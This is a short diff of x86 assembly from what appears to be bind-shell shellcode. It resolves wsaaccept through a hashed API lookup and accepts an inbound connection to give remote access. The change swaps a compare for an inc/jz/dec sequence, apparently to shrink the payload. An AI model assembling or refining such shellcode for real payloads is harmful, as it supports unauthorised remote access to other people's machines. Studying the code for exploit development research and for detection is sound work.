@@ -80,8 +80,9 @@ wsaaccept:
   push edi                ; socket descriptor
   push 0x33BEAC94         ; hash( "ws2_32.dll", "wsaaccept" )
   call ebp                ; wsaaccept( s, 0, 0, &fnCondition, 0)
-  cmp eax, -1             ; if error jump to condition function to wait for another connection
-  jz condition
+  inc eax
+  jz condition            ; if error (eax = -1) jump to condition function to wait for another connection
+  dec eax
   
   push edi                ; push the listening socket to close
   xchg edi, eax           ; replace the listening socket with the new connected socket for further comms
